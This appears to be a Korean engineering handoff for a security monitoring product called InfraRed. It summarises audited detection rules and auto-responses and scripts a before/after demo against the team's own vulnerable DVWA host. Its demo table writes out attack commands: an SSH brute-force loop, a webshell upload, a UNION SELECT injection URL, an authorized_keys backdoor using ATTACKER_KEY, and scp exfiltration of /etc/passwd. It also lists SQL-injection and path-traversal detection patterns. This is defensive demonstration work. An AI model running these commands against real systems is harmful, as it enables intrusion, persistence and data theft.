# Phase 2 Handoff — 탐지/대응 검증 + Demo 시나리오 골격

Phase 2의 핵심 질문: **"코드에 있는 탐지 룰들이 실제로 트리거되고 자동 대응까지 동작하나?"**
이걸 모르면 demo 시나리오를 확정할 수 없음 — 무대에서 "왜 안 잡지?" 사고 발생.

---

## A. Audit 결과 요약

### A-1. 동작 확인된 탐지 룰 (demo 활용 가능)

| 룰 ID | 설명 | 트리거 조건 | Severity / Confidence |
|---|---|---|---|
| AUTH-001 | SSH brute force | 같은 IP에서 5분 안에 3회+ failed password | High / ~0.85 |
| AUTH-003 | Invalid user enumeration | 2회+ "Invalid user" | Medium / ~0.75 |
| AUTH-004 | Failed then success | 3회+ 실패 후 동일 IP에서 성공 (root/privileged면 escalate) | **Critical / ~0.92** |
| AUTH-005 | Suspicious login | off-hours / 외국 IP / 첫 IP | Medium |
| WEB-002 | Admin path scan | 30+ /admin /wp-admin /phpmyadmin 등 5분 | High / ~0.80 |
| WEB-004 | 404 burst | 50+ 404 responses 5분 | Medium |
| WEB-005 | SQL injection | URL에 `UNION SELECT`, `DROP`, hex 등 | **Critical** |
| WEB-006 | Path traversal | URL에 `../` `%2e%2e` | High |
| FIM-001 | authorized_keys 변조 | 파일 hash 변경 감지 (agent) | **Critical** |
| FIM-002 | sshd_config 변조 | 동일 | High |
| FIM-003 | crontab 변조 | 동일 | High |
| FIM-004 | /etc/passwd 변조 | 동일 | High |
| EXEC-FIRST-001 | unknown 바이너리 실행 | /usr/bin /usr/sbin에 baseline 외 hash | Critical |
| DECEPTION-001 | HoneyKey 사용 시도 | 가짜 AWS 키 사용 감지 | Critical |
| DECEPTION-002 | Honey 파일 접근 | `/tmp/.infrared_token_*` 등 | High |
| **CORRELATION** | SSH compromise chain | AUTH-003 + AUTH-001 + AUTH-004 + FIM-001 | **CRITICAL incident** |

### A-2. 미동작 / Stubbed (demo에서 제외)

| 룰 | 상태 | 이유 |
|---|---|---|
| TmpExecutionMonitor | 설계만 | process-level monitor 미구현 |
| UEBA | config만 | ML 모델 미배포 (`ueba_enabled=False`) |
| Sigma rules | 계획만 | 실제 룰 엔진 코드 없음 |
| TAMPER-LOG-001 | 미구현 | 시나리오에 참조만 |
| TRAVEL-001 | 미구현 | 지리적 이동 탐지 — 시나리오 참조만 |

### A-3. 자동 대응 — 동작 확인

| 액션 | 동작 방식 | 트리거 조건 | Demo-able? |
|---|---|---|---|
| **iptables block (자동)** | Agent root가 `iptables -I INPUT 1 -s {ip} -j DROP` | CRITICAL + confidence ≥ 0.85 | ✅ **10초 안에 차단** |
| **Redis deny-list** | API 미들웨어가 403 즉시 반환 | HIGH 이상 자동 | ✅ |
| **Server isolate** | 5개 iptables rule + Dead Man's Switch TTL | manual or critical | ✅ (VM/bare-metal만, 컨테이너 X) |
| Approval workflow | 0.5 ≤ confidence < 0.85 → pending → 수동 승인 | 자동 | ✅ |
| TTL block extension | 30분 → 더 연장 가능 | manual | ✅ |
| Account lock | `passwd -l` | manual command | ✅ |
| Process kill | SIGKILL | manual command | ✅ |
| Forensics → S3 | 로그/메모리 dump S3 업로드 | manual command | ✅ |
| Discord webhook | AI 분석 끝나면 자동 | auto | ✅ (webhook URL 설정 시) |
| Email (SMTP) | CRITICAL만 | auto | ✅ (SMTP 설정 시) |
| **Token revocation** | **없음** | — | ❌ Phase 3 추가 필요 |

### A-4. 핵심 흐름 (audit 발견)

```
공격자 (192.0.2.x)
  → SSH brute (10+ failed/5min)
  → auth.log line "Failed password" 패턴 매칭
  → Agent tailer → /ingest POST
  → Backend events:raw → detection worker
  → AUTH-001 매칭 → confidence 0.92 → CRITICAL signal
  → autoresponse/engine.py → action: iptables_block (auto)
  → Redis commands queue
  → Agent commander poll (5s) → iptables -I INPUT 1 -s {ip} -j DROP
  → /var/log/infrared/iptables_actions.jsonl append
  → 공격자 다음 SYN: 차단됨
```

**T+0 (공격) → T+10s (자동 차단)** — demo 핵심 narrative.

---

## B. Demo 시나리오 골격 (Before / After)

### Setup 권장
- **Defender EC2**: InfraRed agent 설치되어 있지만 초기엔 stop 상태 (`sudo systemctl stop infrared-agent`)
  - 위에 취약한 데모 앱 (DVWA 권장, 또는 nginx + admin 페이지)
- **Attacker host**: 노트북 또는 별도 EC2 (공격 스크립트 실행)
- **Control plane**: 이미 떠있는 백엔드/Dashboard (https://app.infrared.kr)

### Act 1 — Setup (30초)
> "여기 평범한 웹서버가 있습니다. SSH도 열려있고 웹 admin 페이지도 있습니다."
> "지금 InfraRed agent는 꺼진 상태 — 보안 모니터링 없는 상태."

```bash
# 사전 확인
sudo systemctl status infrared-agent | head -3   # Inactive 확인
curl -fsSI http://<defender-ip>:80                # 웹서버 살아있음
ssh ubuntu@<defender-ip>                          # SSH 접근 가능
```

### Act 2 — InfraRed 없이 공격 (2분)
공격 1~5 순차 실행. 다 통함을 보여줌.

| # | 공격 | 명령 (attacker host에서) | 기대 결과 |
|---|---|---|---|
| 1 | SSH brute force | `for i in {1..15}; do sshpass -p wrong ssh root@<defender-ip> 2>&1 \| head -1; done` | 모두 실패하지만 차단 안 됨 |
| 2 | 실제 SSH 침투 (성공) | `ssh root@<defender-ip>` (미리 준비한 정답) | 진입 성공 |
| 3 | Webshell upload | `curl -X POST -F "file=@shell.php" http://<defender-ip>/admin/upload` | 셸 업로드 성공 |
| 4 | SQL injection | `curl "http://<defender-ip>/users?id=1+UNION+SELECT+1,password,3+FROM+users"` | DB 덤프 보임 |
| 5 | authorized_keys 변조 | (침투한 셸에서) `echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys` | 백도어 박힘 |
| 6 | 데이터 유출 | `scp /etc/passwd attacker@host:~/loot/` | 파일 빼냄 |

> "보세요 — 다 뚫립니다. 데이터 노출, 백도어 설치, 데이터 유출까지. Dashboard에는 아무것도 안 보입니다 (agent 꺼져있음)."

### Act 3 — InfraRed Agent 켜기 (30초)
원래 demo는 install one-liner지만 셋업이 이미 됐으니 그냥 start:

```bash
# Defender에서
sudo systemctl start infrared-agent
sleep 15
sudo systemctl status infrared-agent | head -3   # Active (running) 확인
```

> "agent가 30초 안에 첫 heartbeat 보내고 모니터링 시작."

Dashboard → Assets/Hosts 에서 새 호스트가 online으로 뜨는 거 보여줌.

### Act 4 — 같은 공격 다시 (3~5분)
| # | 공격 | 룰 매칭 | 자동 대응 | 시간 |
|---|---|---|---|---|
| 1 | SSH brute (15 attempts) | AUTH-001 + AUTH-003 → confidence 0.92 | iptables block | T+10s |
| 2 | 실제 SSH 침투 시도 | (이미 IP 차단) connection timeout | — | 즉시 거부 |
| 3 | (차단되어 다른 IP 시도) Webshell | WEB-002 + WEB-005 | iptables block 추가 | T+10s |
| 4 | SQL injection | WEB-005 | block | T+10s |
| 5 | (차단 우회 못함) authorized_keys 변조 | FIM-001 | CRITICAL incident | T+5s |
| 6 | 데이터 유출 시도 | (이미 차단) | — | 거부 |

각 단계마다 보여줄 것:
- Dashboard incidents 탭에 새 incident 등장 (실시간)
- `sudo iptables -L INPUT -n | grep <attacker-ip>` → 차단 rule 추가됨
- `sudo tail /var/log/infrared/iptables_actions.jsonl` → append-only 액션 로그
- Discord 채널에 알림 도착 (설정했으면)

### Act 5 — 종합 결과 (1분)
- Dashboard → Incidents 탭 → **"SSH compromise scenario"** CRITICAL incident
  (correlation worker가 AUTH 시퀀스 + FIM을 한 chain으로 묶음)
- Timeline: 각 단계 (recon → brute → access → persistence)
- IOC: attacker IP, kill chain stage, MITRE ATT&CK tactic
- 인시던트 보고서 PDF 자동 생성 (compliance/report.py)
- Discord/email 알림 로그
- iptables 차단 rule TTL 30분 — "30분 후 자동 만료, 그동안 침해 조사 가능"

> "공격은 같았는데 — 데이터 보호됨, 백도어 차단됨, 침투 자동 격리됨."

---

## C. 동규님 실행 체크리스트

### Step 1 — Smoke test 스크립트 commit + push (5분)

```powershell
cd C:\InfraRed
git status   # scripts/smoke_phase2.py + docs/PHASE2_HANDOFF.md 보일 것
git add scripts/smoke_phase2.py docs/PHASE2_HANDOFF.md
git commit -m "feat(phase2): smoke test script + handoff doc — audit + demo scenario"
git push origin main
```

CI/CD 자동 트리거 → 새 이미지가 EC2에 들어감. 5~10분.

### Step 2 — 룰 동작 검증 (EC2에서, 15분)

```bash
# EC2 SSH
ssh -i C:\InfraRed\infrared-key.pem ec2-user@<DEFENDER_IP>

# scripts/smoke_phase2.py를 backend container 안에서 직접 실행
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py list

# 한 시나리오씩 실행
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py auth-brute --ip 192.0.2.100
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py auth-fts --ip 192.0.2.100
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py web-sqli --ip 192.0.2.101
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py web-admin-scan --ip 192.0.2.102
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py fim --ip 192.0.2.103
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py full-chain --ip 192.0.2.104

# 각 시나리오 후 검증
sudo docker exec -it infrared-ingestion python /app/scripts/smoke_phase2.py verify --ip 192.0.2.100
```

(`/app/scripts/` 경로가 컨테이너에 없으면 호스트에서 직접:
`sudo python3 /opt/infrared/scripts/smoke_phase2.py ...` — 단 scripts/가 EC2 호스트에 있어야)

### Step 3 — 결과 기록

각 시나리오에 대해:
- [ ] auth-brute → AUTH-001/003 incident 생성 + iptables block?
- [ ] auth-fts → AUTH-004 CRITICAL incident 생성?
- [ ] web-sqli → WEB-005 CRITICAL incident?
- [ ] web-admin-scan → WEB-002 incident?
- [ ] fim → FIM-001 CRITICAL incident?
- [ ] full-chain → "SSH compromise scenario" 한 chain으로 묶임?
- [ ] iptables block 실제로 들어옴? (시나리오마다 다른 IP니까 rule 5+개)
- [ ] Dashboard에 incident 실시간 표시?

### Step 4 — 안 되는 룰 발견 시
이 문서의 A-1 표에서 "❌ 안됨"으로 표시 → demo 시나리오 (Section B)에서 제외 또는 수정.

### Step 5 — Demo 시나리오 리허설 준비
B의 Act 1~5 흐름대로 한 번 처음부터 끝까지 돌려보기. 막히는 단계 있으면 보강.

특히 사전 준비물:
- DVWA 또는 vulnerable 앱 (Defender EC2에 설치)
- Attacker host (노트북 또는 별도 EC2)
- Discord webhook URL (tenant_settings 테이블에 INSERT)
- SMTP 또는 AWS SES 설정 (alert email용, optional)

---

## D. Phase 2 → Phase 3 이월 항목

이번 Phase 2 audit으로 발견된, 다음 단계에서 처리할 것:

| 항목 | 우선순위 | 이유 |
|---|---|---|
| **Token revocation 구현** | ★★ | 코드 자체 없음. 보안 제품에 token revoke 없으면 감점. |
| **Dependabot high 6건** | ★★ | 보안 제품 main에 high CVE 남기면 인상 나쁨 |
| **UEBA wiring 완성** | ★ | 코드 인프라는 있는데 모델 미배포 |
| **Sigma 룰 엔진 통합** | ★ | UI 페이지(SigmaMarketplacePage)는 있는데 엔진 없음 |
| **TmpExecutionMonitor 구현** | · | Demo narrative에서 빠져도 무방 |
| **Container isolation (docker stop)** | ★ | "container-based 환경 격리" 가능하면 demo 강화 |
| **AWS Security Group 자동화** | · | iptables로 충분 |
| **Sentry + CloudWatch Logs** | ★★ | demo 중 에러 즉시 캐치 (운영 안전망) |
| **Slack adapter wiring 완성** | ★ | Discord는 있지만 Slack도 demo 효과 ↑ |
| **Email 자동 발송 (SES)** | ★ | 초대 / 인시던트 / 보고서 발송 |

이건 Phase 3 작업 목록의 시작점.

---

## ⚠ Smoke test 한계

- `smoke_phase2.py`는 **합성 이벤트만** 주입 — 실제 OS-level 공격(authorized_keys 변조)은 attacker host에서 직접 수행
- `fim` 시나리오는 agent의 hash 비교가 아니라 **agent가 알림을 보냈다고 가정**한 합성 이벤트
- 진짜 FIM 검증: Defender EC2의 `/root/.ssh/authorized_keys`를 실제로 변조 → agent의 FIM watcher가 다음 polling cycle에서 감지하는지 확인
